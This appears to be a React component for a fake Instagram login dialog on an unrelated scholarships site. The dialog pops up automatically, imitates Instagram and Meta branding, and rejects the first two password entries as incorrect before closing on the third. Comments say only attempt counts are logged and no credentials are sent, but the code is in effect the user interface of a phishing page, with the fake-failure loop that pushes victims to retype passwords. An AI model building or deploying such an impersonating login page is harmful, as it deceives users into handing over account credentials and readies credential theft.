
"use client";

import { useEffect, useRef, useState } from "react";

const DELAY_MS = 2000;
const OPEN_EVENT = "open-login";

export function OpenLoginButton({
  className = "",
}: {
  className?: string;
}) {
  return (
    <button
      type="button"
      className={className}
      onClick={() =>
        window.dispatchEvent(new Event(OPEN_EVENT))
      }
    >
      Log in
    </button>
  );
}

function InstagramMark() {
  return (
    <div
      className="flex h-16 w-16 items-center justify-center rounded-2xl"
      style={{
        background:
          "linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5)",
      }}
    >
      <svg
        viewBox="0 0 24 24"
        className="h-9 w-9"
        fill="none"
        stroke="white"
        strokeWidth={2}
      >
        <rect x="3" y="3" width="18" height="18" rx="5" />
        <circle cx="12" cy="12" r="4" />
        <circle
          cx="17.2"
          cy="6.8"
          r="1"
          fill="white"
          stroke="none"
        />
      </svg>
    </div>
  );
}

export default function LoginDialog() {
  const [open, setOpen] = useState(false);
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [showPass, setShowPass] = useState(false);

  const [attempt, setAttempt] = useState(0);
  const [loginError, setLoginError] = useState("");
  const [loading, setLoading] = useState(false);

  const userRef = useRef<HTMLInputElement>(null);

  /*
   * Open automatically after page load and from navbar.
   */
  useEffect(() => {
    const timer = setTimeout(() => {
      setOpen(true);
    }, DELAY_MS);

    const showLogin = () => {
      setOpen(true);
    };

    window.addEventListener(OPEN_EVENT, showLogin);

    return () => {
      clearTimeout(timer);
      window.removeEventListener(OPEN_EVENT, showLogin);
    };
  }, []);

  /*
   * Focus username and prevent background scrolling.
   */
  useEffect(() => {
    if (!open) return;

    userRef.current?.focus();

    const previousOverflow = document.body.style.overflow;
    document.body.style.overflow = "hidden";

    return () => {
      document.body.style.overflow = previousOverflow;
    };
  }, [open]);

  /*
   * Clear validation error when the user changes a field.
   */
  useEffect(() => {
    if (loginError) {
      setLoginError("");
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [user, pass]);

  /*
   * Send SAFE, NON-SENSITIVE attempt information.
   *
   * Do not send username, password, email, or any credentials.
   */
  async function logAttempt(attemptNumber: number) {
    try {
      await fetch("/api/login-attempt", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          attempt: attemptNumber,
          timestamp: new Date().toISOString(),
          usernameProvided: user.trim().length > 0,
          passwordProvided: pass.trim().length > 0,
        }),
      });
    } catch (error) {
      console.error("Unable to log login attempt:", error);
    }
  }

  /*
   * Demo login flow.
   *
   * Attempt 1:
   * Incorrect credentials
   *
   * Attempt 2:
   * Incorrect credentials
   *
   * Attempt 3:
   * Close dialog
   *
   * No credentials are transmitted.
   */
  async function handleSubmit(
    e: React.FormEvent<HTMLFormElement>
  ) {
    e.preventDefault();

    const username = user.trim();
    const password = pass.trim();

    /*
     * Both fields are mandatory.
     * Browser cannot submit until both are filled.
     */
    if (!username || !password) {
      setLoginError(
        "Please enter your username/email and password."
      );
      return;
    }

    if (loading) return;

    setLoading(true);
    setLoginError("");

    const currentAttempt = attempt + 1;

    /*
     * Log only non-sensitive information.
     */
    await logAttempt(currentAttempt);

    /*
     * First attempt.
     */
    if (currentAttempt === 1) {
      setAttempt(1);
      setLoginError(
        "Incorrect email/username or password."
      );
      setLoading(false);
      return;
    }

    /*
     * Second attempt.
     */
    if (currentAttempt === 2) {
      setAttempt(2);
      setLoginError(
        "Incorrect email/username or password."
      );
      setLoading(false);
      return;
    }

    /*
     * Third attempt.
     *
     * Close the dialog only after the third valid submission.
     */
    setAttempt(3);
    setLoading(false);
    setOpen(false);
  }

  /*
   * Create account must NOT close the dialog.
   */
  function handleCreateAccount() {
    setLoginError("");
  }

  if (!open) return null;

  const field =
    "w-full rounded-full border border-[#363636] bg-black px-4 py-3.5 text-[14px] text-white placeholder:text-[#8e8e8e] outline-none transition-colors focus:border-[#6b6b6b]";

  /*
   * Login is disabled until BOTH fields contain text.
   */
  const ready =
    user.trim().length > 0 &&
    pass.trim().length > 0;

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center overflow-y-auto bg-black/50 p-4"
      role="presentation"
    >
      <div className="flex w-full max-w-[680px] flex-col items-center gap-3 lg:relative lg:w-auto lg:flex-row lg:items-center lg:gap-0">

        {/* Information bubble */}
        <div className="pop relative w-full max-w-[320px] rounded-lg border border-[#dbdbdb] bg-white p-4 text-center shadow-lg lg:absolute lg:right-full lg:mr-5 lg:w-64 lg:max-w-none lg:text-left">
          <p className="text-[14px] font-semibold leading-snug text-[#262626]">
            Log in with Instagram to unlock and browse all
            available scholarships.
          </p>

          <span
            aria-hidden="true"
            className="absolute left-1/2 top-full h-3.5 w-3.5 -translate-x-1/2 -translate-y-1/2 rotate-45 border-b border-r border-[#dbdbdb] bg-white lg:left-auto lg:right-[-7px] lg:top-8 lg:translate-x-0 lg:translate-y-0 lg:border-b-0 lg:border-r lg:border-t"
          />
        </div>

        {/* Main dialog */}
        <div
          className="pop relative flex w-full max-w-[680px] flex-col rounded-[28px] bg-black px-6 pb-8 pt-6 sm:px-10 md:px-14"
          role="dialog"
          aria-modal="true"
          aria-labelledby="login-title"
        >
          {/* Language */}
          <div className="mb-6 flex justify-center">
            <span className="flex items-center gap-1 text-[13px] text-[#a8a8a8]">
              English (US)

              <svg
                viewBox="0 0 20 20"
                className="h-3 w-3"
                fill="currentColor"
                aria-hidden="true"
              >
                <path d="M5 7l5 6 5-6z" />
              </svg>
            </span>
          </div>

          {/* Instagram logo */}
          <div className="mb-8 flex justify-center">
            <InstagramMark />
          </div>

          <h2
            id="login-title"
            className="sr-only"
          >
            Log in
          </h2>

          {/* Form */}
          <form
            onSubmit={handleSubmit}
            noValidate
            className="space-y-3"
          >
            {/* Username */}
            <input
              ref={userRef}
              type="text"
              value={user}
              onChange={(e) => setUser(e.target.value)}
              placeholder="Username, email or mobile number"
              autoComplete="username"
              aria-label="Username, email or mobile number"
              className={field}
            />

            {/* Password */}
            <div className="relative">
              <input
                type={showPass ? "text" : "password"}
                value={pass}
                onChange={(e) => setPass(e.target.value)}
                placeholder="Password"
                autoComplete="current-password"
                aria-label="Password"
                className={`${field} pr-12`}
              />

              <button
                type="button"
                onClick={() =>
                  setShowPass((value) => !value)
                }
                aria-label={
                  showPass
                    ? "Hide password"
                    : "Show password"
                }
                className="absolute right-4 top-1/2 -translate-y-1/2 text-[#a8a8a8] hover:text-white"
              >
                {showPass ? (
                  <svg
                    viewBox="0 0 24 24"
                    className="h-5 w-5"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth={1.8}
                    aria-hidden="true"
                  >
                    <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7Z" />
                    <circle cx="12" cy="12" r="3" />
                  </svg>
                ) : (
                  <svg
                    viewBox="0 0 24 24"
                    className="h-5 w-5"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth={1.8}
                    aria-hidden="true"
                  >
                    <path d="M3 3l18 18" />
                    <path d="M10.6 5.2A10.9 10.9 0 0 1 12 5c6.4 0 10 7 10 7a15.6 15.6 0 0 1-3.4 4.2M6.6 6.6C4 8.3 2 12 2 12s3.6 7 10 7c1.6 0 3-.4 4.2-1" />
                    <path d="M9.9 9.9a3 3 0 0 0 4.2 4.2" />
                  </svg>
                )}
              </button>
            </div>

            {/* Error */}
            {loginError && (
              <p
                className="pt-1 text-center text-[13px] text-[#ed4956]"
                role="alert"
              >
                {loginError}
              </p>
            )}

            {/* Login */}
            <button
              type="submit"
              disabled={!ready || loading}
              className="!mt-5 w-full rounded-full bg-[#3797f0] py-3.5 text-sm font-semibold text-white transition-colors enabled:hover:bg-[#1877f2] disabled:cursor-not-allowed disabled:opacity-40"
            >
              {loading ? "Logging in..." : "Log in"}
            </button>
          </form>

          {/* Forgot password */}
          <button
            type="button"
            onClick={() => setLoginError("")}
            className="mt-5 block w-full text-center text-[13px] text-[#a8a8a8] hover:text-white"
          >
            Forgot password?
          </button>

          {/* Create account */}
          <div className="mt-12">
            <button
              type="button"
              onClick={handleCreateAccount}
              className="w-full rounded-full border border-[#3797f0] py-3.5 text-sm font-semibold text-[#3797f0] transition-colors hover:bg-[#3797f0]/10"
            >
              Create new account
            </button>
          </div>

          {/* Meta */}
          <div className="mt-6 flex items-center justify-center gap-1 text-[13px] text-[#a8a8a8]">
            <svg
              viewBox="0 0 24 24"
              className="h-4 w-4"
              fill="currentColor"
              aria-hidden="true"
            >
              <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2Zm-1.2 15.3-3.6-3.6a1 1 0 0 1 1.4-1.4l2.2 2.2 5.4-6.6a1 1 0 1 1 1.6 1.2l-6.1 7.4a1 1 0 0 1-1.5.2 1 1 0 0 1-.1-.1Z" />
            </svg>
            Meta
          </div>
        </div>
      </div>
    </div>
  );
}
